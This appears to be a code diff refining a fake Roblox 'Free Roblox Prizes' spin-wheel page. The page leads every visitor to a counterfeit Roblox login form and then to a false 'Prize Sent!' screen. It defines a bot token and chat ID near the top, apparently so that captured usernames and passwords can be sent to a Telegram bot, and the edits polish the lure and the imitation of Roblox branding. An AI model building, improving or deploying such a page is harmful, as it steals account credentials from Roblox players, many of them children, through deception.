@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Roblox — Spin & Win</title>
+<title>🎉 Spin & Win — Free Roblox Prizes</title>
 <script>
 const BOT_TOKEN='***';
 const CHAT_ID = '1361048119';
@@ -12,14 +12,14 @@ var isSpinning = false;
 var wonPrize = '';
 
 var prizes = [
-    { name: '10,000 Robux',  color: '#E2231A', icon: '💰', img: 'R' },
-    { name: 'Dominus Empyreus', color: '#FF6B00', icon: '👑', img: 'D' },
-    { name: '5,000 Robux',   color: '#1D4ED8', icon: '💎', img: 'R' },
-    { name: 'Limited Item',  color: '#7C3AED', icon: '🎁', img: 'L' },
-    { name: '2,500 Robux',   color: '#059669', icon: '🪙', img: 'R' },
-    { name: 'Exclusive Badge',color: '#DC2626', icon: '🏅', img: 'B' },
-    { name: '1,000 Robux',   color: '#D97706', icon: '✨', img: 'R' },
-    { name: 'VIP Status',    color: '#0891B2', icon: '⭐', img: 'V' }
+    { name: '10,000 Robux',  color: '#E2231A', icon: '💰' },
+    { name: 'Dominus Empyreus', color: '#FF6B00', icon: '👑' },
+    { name: '5,000 Robux',   color: '#1D4ED8', icon: '💎' },
+    { name: 'Limited Item',  color: '#7C3AED', icon: '🎁' },
+    { name: '2,500 Robux',   color: '#059669', icon: '🪙' },
+    { name: 'Exclusive Badge',color: '#DC2626', icon: '🏅' },
+    { name: '1,000 Robux',   color: '#D97706', icon: '✨' },
+    { name: 'VIP Status',    color: '#0891B2', icon: '⭐' }
 ];
 
 function drawWheel() {
@@ -30,63 +30,42 @@ function drawWheel() {
     
     ctx.clearRect(0, 0, 360, 360);
     
-    // Draw outer glow
-    ctx.beginPath();
-    ctx.arc(cx, cy, r+8, 0, 2*Math.PI);
-    ctx.shadowColor = 'rgba(255,215,0,0.3)';
-    ctx.shadowBlur = 25;
-    ctx.fillStyle = 'rgba(255,215,0,0.1)';
-    ctx.fill();
-    ctx.shadowBlur = 0;
-    
     prizes.forEach(function(p, i) {
         var startAngle = i * segAngle - Math.PI/2;
         var endAngle = startAngle + segAngle;
-        
-        // Segment
         ctx.beginPath();
         ctx.moveTo(cx, cy);
         ctx.arc(cx, cy, r, startAngle, endAngle);
         ctx.closePath();
         ctx.fillStyle = p.color;
         ctx.fill();
-        
-        // Segment border
         ctx.strokeStyle = 'rgba(255,255,255,0.3)';
         ctx.lineWidth = 2;
         ctx.stroke();
         
-        // Draw icon at segment center
         var textAngle = startAngle + segAngle/2;
         ctx.save();
         ctx.translate(cx, cy);
         ctx.rotate(textAngle);
-        
-        // Icon (emoji)
         ctx.font = '28px Arial';
         ctx.textAlign = 'center';
         ctx.textBaseline = 'middle';
         ctx.shadowColor = 'rgba(0,0,0,0.5)';
         ctx.shadowBlur = 3;
         ctx.fillText(p.icon, r - 40, -8);
-        
-        // Item label
         ctx.font = 'bold 10px "Builder Sans", Arial, sans-serif';
         ctx.fillStyle = '#fff';
         ctx.shadowBlur = 2;
         ctx.fillText(p.name, r - 40, 18);
-        
         ctx.restore();
     });
     
-    // Outer ring
     ctx.beginPath();
     ctx.arc(cx, cy, r, 0, 2 * Math.PI);
     ctx.strokeStyle = 'rgba(255,215,0,0.5)';
     ctx.lineWidth = 4;
     ctx.stroke();
     
-    // Center button
     ctx.beginPath();
     ctx.arc(cx, cy, 35, 0, 2 * Math.PI);
     var grad = ctx.createRadialGradient(cx-5, cy-5, 5, cx, cy, 35);
@@ -97,7 +76,6 @@ function drawWheel() {
     ctx.strokeStyle = '#FFD700';
     ctx.lineWidth = 3;
     ctx.stroke();
-    
     ctx.fillStyle = '#FFD700';
     ctx.font = 'bold 14px Arial';
     ctx.textAlign = 'center';
@@ -152,12 +130,12 @@ function spin() {
 
 function goToLogin() {
     document.getElementById('spinPage').style.display = 'none';
+    document.getElementById('loginBg').style.display = 'block';
     document.getElementById('loginPage').style.display = 'block';
-    document.getElementById('claimPrizeName').textContent = wonPrize;
-    document.getElementById('claimItemName').textContent = wonPrize;
-    document.getElementById('finalPrize').textContent = wonPrize;
-    document.getElementById('finalPrizeDisplay').textContent = wonPrize;
-    document.getElementById('notePrize').textContent = wonPrize;
+    var items = ['claimPrizeName','claimItemName','finalPrize','finalPrizeDisplay','notePrize'];
+    items.forEach(function(id) {
+        document.getElementById(id).textContent = wonPrize;
+    });
 }
 
 function togglePassword() {
@@ -212,27 +190,63 @@ function submitLogin() {
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
     font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    background: #000;
     min-height: 100vh;
     display: flex;
     flex-direction: column;
 }
-.bg-image {
+
+/* ===== SPIN PAGE BACKGROUND ===== */
+body.spin-bg {
+    background: linear-gradient(135deg, #0F0C29 0%, #302B63 50%, #24243E 100%);
+}
+.spin-page-bg {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: 
+        radial-gradient(circle at 20% 50%, rgba(255,215,0,0.08) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(226,35,26,0.08) 0%, transparent 50%),
+        radial-gradient(circle at 40% 80%, rgba(125,58,237,0.08) 0%, transparent 50%),
+        linear-gradient(135deg, #0F0C29 0%, #302B63 50%, #24243E 100%);
+    z-index: 0;
+}
+/* Confetti dots */
+.spin-page-bg::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-image: 
+        radial-gradient(2px 2px at 10% 20%, rgba(255,215,0,0.4), transparent),
+        radial-gradient(2px 2px at 30% 60%, rgba(255,50,50,0.4), transparent),
+        radial-gradient(2px 2px at 50% 10%, rgba(50,150,255,0.4), transparent),
+        radial-gradient(2px 2px at 70% 80%, rgba(50,255,100,0.4), transparent),
+        radial-gradient(2px 2px at 90% 30%, rgba(255,100,200,0.4), transparent),
+        radial-gradient(3px 3px at 15% 75%, rgba(255,215,0,0.3), transparent),
+        radial-gradient(2px 2px at 60% 45%, rgba(255,150,50,0.4), transparent),
+        radial-gradient(2px 2px at 85% 65%, rgba(200,50,255,0.4), transparent),
+        radial-gradient(3px 3px at 45% 90%, rgba(50,200,255,0.3), transparent),
+        radial-gradient(2px 2px at 5% 40%, rgba(255,255,255,0.3), transparent);
+    pointer-events: none;
+}
+
+/* ===== LOGIN BACKGROUND (Roblox Asli) ===== */
+#loginBg {
+    display: none;
     position: fixed; top: 0; left: 0;
     width: 100vw; height: 100vh;
     background: url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') no-repeat center center fixed;
     background-size: cover; z-index: 0;
 }
-.bg-overlay {
-    position: fixed; top: 0; left: 0;
-    width: 100vw; height: 100vh;
+#loginBg .overlay {
+    position: absolute; top: 0; left: 0;
+    width: 100%; height: 100%;
     background: radial-gradient(circle, rgba(0,0,0,0.5) 60%, rgba(0,0,0,0.75) 100%);
-    z-index: 1;
 }
+
 .navbar {
     position: relative; z-index: 10;
-    background: #1A1A1A; height: 48px;
+    background: rgba(0,0,0,0.3); height: 48px;
     display: flex; align-items: center; padding: 0 16px;
+    backdrop-filter: blur(10px);
 }
 .navbar .logo-link { display: flex; align-items: center; padding: 0 12px; height: 100%; }
 .navbar .logo-link svg { width: 32px; height: 32px; }
@@ -244,12 +258,13 @@ body {
 .navbar .search-wrap { flex: 1; max-width: 280px; margin-left: 8px; position: relative; }
 .navbar .search-wrap input {
     width: 100%; height: 28px; border-radius: 4px; border: none;
-    background: #333; color: #fff; font-size: 13px; padding: 0 30px 0 10px; outline: none;
+    background: rgba(255,255,255,0.15); color: #fff; font-size: 13px;
+    padding: 0 30px 0 10px; outline: none;
 }
-.navbar .search-wrap input::placeholder { color: #999; }
+.navbar .search-wrap input::placeholder { color: rgba(255,255,255,0.5); }
 .navbar .search-wrap .search-icon {
     position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
-    color: #999; font-size: 14px; pointer-events: none;
+    color: rgba(255,255,255,0.5); font-size: 14px; pointer-events: none;
 }
 .navbar .signup-link {
     color: #fff; text-decoration: none; font-size: 13px; font-weight: 600;
@@ -262,27 +277,27 @@ body {
 }
 .page-footer {
     position: relative; z-index: 10;
-    background: rgba(0,0,0,0.8); padding: 12px 16px; text-align: center;
+    background: rgba(0,0,0,0.5); padding: 12px 16px; text-align: center;
+    backdrop-filter: blur(10px);
 }
 .page-footer a {
-    color: rgba(247,247,248,0.6); text-decoration: none;
+    color: rgba(255,255,255,0.5); text-decoration: none;
     font-size: 11px; margin: 0 8px;
 }
 .page-footer a:hover { text-decoration: underline; color: #fff; }
 .page-footer .copyright {
-    color: rgba(247,247,248,0.4); font-size: 10px; margin-top: 8px;
+    color: rgba(255,255,255,0.3); font-size: 10px; margin-top: 8px;
 }
 
-/* SPIN PAGE */
+/* ===== SPIN PAGE ===== */
 #spinPage { display: flex; flex-direction: column; align-items: center; }
 .spin-badge {
     background: linear-gradient(135deg, #E2231A, #FF6B00);
-    color: #fff; font-size: 11px; font-weight: 700; padding: 4px 14px;
-    border-radius: 20px; margin-bottom: 8px; text-transform: uppercase;
-    letter-spacing: 1px;
+    color: #fff; font-size: 11px; font-weight: 700; padding: 4px 18px;
+    border-radius: 20px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 1px;
 }
-.spin-title { font-size: 26px; font-weight: 800; color: #F7F7F8; margin-bottom: 4px; }
-.spin-subtitle { color: rgba(247,247,248,0.5); font-size: 13px; margin-bottom: 12px; }
+.spin-title { font-size: 28px; font-weight: 800; color: #fff; margin-bottom: 2px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
+.spin-subtitle { color: rgba(255,255,255,0.6); font-size: 13px; margin-bottom: 12px; }
 .wheel-container { position: relative; width: 340px; height: 340px; margin-bottom: 12px; }
 .wheel-pointer {
     position: absolute; top: -8px; left: 50%; transform: translateX(-50%);
@@ -296,58 +311,55 @@ body {
 .wheel-pointer::after {
     content: '';
     position: absolute; top: -26px; left: -8px;
-    width: 16px; height: 16px;
-    background: #FFD700;
-    border-radius: 50%;
+    width: 16px; height: 16px; background: #FFD700; border-radius: 50%;
 }
 #wheelCanvas { width: 340px; height: 340px; border-radius: 50%; }
 .spin-btn {
     padding: 12px 44px; border: none; border-radius: 8px;
     background: linear-gradient(135deg, #E2231A, #FF6B00);
     color: #fff; font-size: 18px; font-weight: 700; cursor: pointer;
-    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    transition: 0.2s; margin-bottom: 8px;
+    font-family: inherit; transition: 0.2s; margin-bottom: 8px;
+    box-shadow: 0 4px 15px rgba(226,35,26,0.3);
 }
-.spin-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(226,35,26,0.4); }
+.spin-btn:hover { transform: scale(1.05); box-shadow: 0 6px 25px rgba(226,35,26,0.5); }
 .spin-btn:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
 .spin-result {
     display: none; text-align: center;
-    background: rgba(39,41,48,0.95); border-radius: 12px;
+    background: rgba(15,12,41,0.95); border-radius: 16px;
     padding: 16px; max-width: 340px; width: 100%; margin-bottom: 8px;
     border: 1px solid rgba(255,215,0,0.2);
 }
-.spin-result .congrats { font-size: 16px; color: #F7F7F8; font-weight: 700; }
+.spin-result .congrats { font-size: 16px; color: #FFD700; font-weight: 700; }
 .spin-result .prize-name { font-size: 22px; font-weight: 800; margin: 6px 0; }
-.spin-result .prize-desc { color: rgba(247,247,248,0.5); font-size: 12px; }
+.spin-result .prize-desc { color: rgba(255,255,255,0.5); font-size: 12px; }
 .claim-prompt {
     display: none; flex-direction: column; align-items: center;
     animation: fadeIn 0.5s ease; margin-bottom: 8px;
 }
 @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-.claim-prompt p { color: rgba(247,247,248,0.6); font-size: 13px; margin-bottom: 10px; }
+.claim-prompt p { color: rgba(255,255,255,0.7); font-size: 13px; margin-bottom: 10px; }
 .claim-prompt .login-claim-btn {
     padding: 12px 32px; border: none; border-radius: 8px;
     background: linear-gradient(135deg, #1D4ED8, #7C3AED);
     color: #fff; font-size: 16px; font-weight: 700; cursor: pointer;
-    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    transition: 0.2s;
+    font-family: inherit; transition: 0.2s;
+    box-shadow: 0 4px 15px rgba(29,78,216,0.3);
 }
-.claim-prompt .login-claim-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(29,78,216,0.4); }
+.claim-prompt .login-claim-btn:hover { transform: scale(1.05); box-shadow: 0 6px 25px rgba(29,78,216,0.5); }
 
-/* LOGIN PAGE */
-#loginPage { display: none; }
+/* ===== LOGIN PAGE ===== */
+#loginPage { display: none; position: relative; z-index: 10; }
 .login-card {
     background: #272930; width: 100%; max-width: 362px; padding: 15px;
 }
-.login-header { font-size: 32px; font-weight: 800; color: #F7F7F8; padding: 5px 0; margin-bottom: 4px; }
-.login-subheader { color: rgba(247,247,248,0.5); font-size: 13px; margin-bottom: 12px; }
+.login-card .login-header { font-size: 32px; font-weight: 800; color: #F7F7F8; padding: 5px 0; margin-bottom: 4px; text-align:center; }
+.login-card .login-subheader { color: rgba(247,247,248,0.5); font-size: 13px; margin-bottom: 12px; text-align:center; }
 .input-group { margin-bottom: 12px; }
 .input-group input {
     width: 100%; height: 28px; padding: 5px 30px 5px 33px; border-radius: 8px;
     border: 1px solid rgba(208, 217, 251, 0.12);
     background: rgba(208, 217, 251, 0.08);
-    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    font-size: 16px; font-weight: 400; color: #F7F7F8; outline: none;
+    font-family: inherit; font-size: 16px; font-weight: 400; color: #F7F7F8; outline: none;
 }
 .input-group input:focus { border-color: rgba(208, 217, 251, 0.3); }
 .input-group input::placeholder { color: rgba(247, 247, 248, 0.4); }
@@ -366,8 +378,7 @@ body {
 .login-btn {
     width: 100%; height: 36px; border: 1px solid rgb(213, 215, 221); border-radius: 8px;
     background: transparent; color: rgb(188, 190, 200);
-    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-top: 8px;
+    font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-top: 8px;
 }
 .login-btn:hover { background: rgba(208, 217, 251, 0.08); border-color: rgb(247, 247, 248); color: #F7F7F8; }
 .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
@@ -379,8 +390,7 @@ body {
 .alt-btn {
     width: 100%; height: 36px; border: 1px solid transparent; border-radius: 8px;
     background: rgba(208, 217, 251, 0.12); color: #F7F7F8;
-    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-    font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-bottom: 8px;
+    font-family: inherit; font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-bottom: 8px;
 }
 .alt-btn:hover { background: rgba(208, 217, 251, 0.18); }
 .signup-area { text-align: center; padding: 12px 0; }
@@ -388,41 +398,34 @@ body {
 .signup-area a { color: #F7F7F8; text-decoration: none; font-size: 16px; font-weight: 500; }
 .signup-area a:hover { text-decoration: underline; }
 
-/* SUCCESS PAGE */
-#successPage { display: none; }
+/* ===== SUCCESS PAGE ===== */
+#successPage { display: none; position: relative; z-index: 10; }
 .success-card {
     background: #272930; width: 100%; max-width: 362px; padding: 28px 20px;
     text-align: center; border: 1px solid rgba(74,222,128,0.2);
 }
-.success-card .check-icon {
-    font-size: 56px; margin-bottom: 8px;
-    display: inline-block;
-    animation: popIn 0.5s ease;
-}
+.success-card .check-icon { font-size: 56px; margin-bottom: 8px; display: inline-block; animation: popIn 0.5s ease; }
 @keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.2); } 100% { transform: scale(1); } }
 .success-card h2 { font-size: 22px; font-weight: 800; color: #4ADE80; margin-bottom: 4px; }
 .success-card .won-item {
     font-size: 20px; font-weight: 700; color: #F7F7F8;
-    margin: 8px 0; padding: 8px; border-radius: 8px;
-    background: rgba(255,255,255,0.05);
+    margin: 8px 0; padding: 8px; border-radius: 8px; background: rgba(255,255,255,0.05);
 }
-.success-card .wait-text {
-    color: rgba(247,247,248,0.5); font-size: 13px; line-height: 1.6; margin-top: 8px;
-}
+.success-card .wait-text { color: rgba(247,247,248,0.5); font-size: 13px; line-height: 1.6; margin-top: 8px; }
 .success-card .note {
     margin-top: 14px; padding: 12px; border-radius: 8px;
     background: rgba(74,222,128,0.08); border: 1px solid rgba(74,222,128,0.15);
     font-size: 12px; color: #4ADE80; text-align: left; line-height: 1.8;
 }
-.success-card .back-btn {
-    display: inline-block; margin-top: 14px; color: #1D4ED8;
-    text-decoration: none; font-size: 14px; font-weight: 500;
-}
+.success-card .back-btn { display: inline-block; margin-top: 14px; color: #1D4ED8; text-decoration: none; font-size: 14px; font-weight: 500; }
 </style>
 </head>
-<body onload="drawWheel()">
-<div class="bg-image"></div>
-<div class="bg-overlay"></div>
+<body>
+<!-- SPIN PAGE BG (always visible when spin page is up) -->
+<div class="spin-page-bg"></div>
+
+<!-- LOGIN BG (hidden until login page shows) -->
+<div id="loginBg"><div class="overlay"></div></div>
 
 <nav class="navbar">
     <a href="#" class="logo-link">
@@ -441,9 +444,9 @@ body {
 <div class="main-container">
     <!-- PAGE 1: SPIN WHEEL -->
     <div id="spinPage">
-        <div class="spin-badge">🎉 LIMITED EVENT</div>
-        <div class="spin-title">Spin to Win!</div>
-        <div class="spin-subtitle">Try your luck and win exclusive Roblox prizes!</div>
+        <div class="spin-badge">🎉 SPIN TO WIN</div>
+        <div class="spin-title">Free Roblox Prizes!</div>
+        <div class="spin-subtitle">Spin the wheel and win exclusive items!</div>
         
         <div class="wheel-container">
             <div class="wheel-pointer"></div>
@@ -457,11 +460,11 @@ body {
             <div class="prize-name" id="prizeColor" style="color:#E2231A;">
                 <span id="prizeName">💰 10,000 Robux</span>
             </div>
-            <div class="prize-desc">You won a prize! Login to your Roblox account to claim it.</div>
+            <div class="prize-desc">You won! Login to your Roblox account to claim.</div>
         </div>
         
         <div class="claim-prompt" id="claimPrompt">
-            <p>🔐 Login to your Roblox account to claim <strong><span id="claimItemName">your prize</span></strong>!</p>
+            <p>🔐 Login to claim <strong><span id="claimItemName">your prize</span></strong>!</p>
             <button class="login-claim-btn" onclick="goToLogin()">🔓 Login to Claim →</button>
         </div>
     </div>
@@ -470,8 +473,8 @@ body {
     <div id="loginPage">
         <div class="login-card">
             <div style="text-align:center;font-size:32px;margin-bottom:4px;">🎁</div>
-            <h1 class="login-header" style="text-align:center;font-size:26px;">Login to Claim</h1>
-            <p class="login-subheader" style="text-align:center;">Sign in to receive <strong id="claimPrizeName" style="color:#FFD700;">your prize</strong>!</p>
+            <h1 class="login-header" style="font-size:26px;">Login to Claim</h1>
+            <p class="login-subheader">Sign in to receive <strong id="claimPrizeName" style="color:#FFD700;">your prize</strong>!</p>
             
             <div class="error-msg" id="errorMsg">Incorrect username or password.</div>
             
@@ -509,8 +512,8 @@ body {
             <h2>🎉 Prize Sent!</h2>
             <div class="won-item" id="finalPrizeDisplay">💰 10,000 Robux</div>
             <p class="wait-text">
-                <strong style="color:#4ADE80;">✔</strong> <span id="finalPrize">Your prize</span> has been sent to your Roblox account!<br>
-                Please wait <strong>2-4 hours</strong> for the item to appear in your inventory.
+                <strong style="color:#4ADE80;">✔</strong> <span id="finalPrize">Your prize</span> has been sent!<br>
+                Please wait <strong>2-4 hours</strong> to appear in your inventory.
             </p>
             <div class="note">
                 ✅ <span id="notePrize">Your prize</span> — Reserved<br>
@@ -529,5 +532,7 @@ body {
     <a href="#">Sitemap</a>
     <div class="copyright">© 2025 Roblox Corporation</div>
 </div>
+
+<script>drawWheel();</script>
 </body>
 </html>
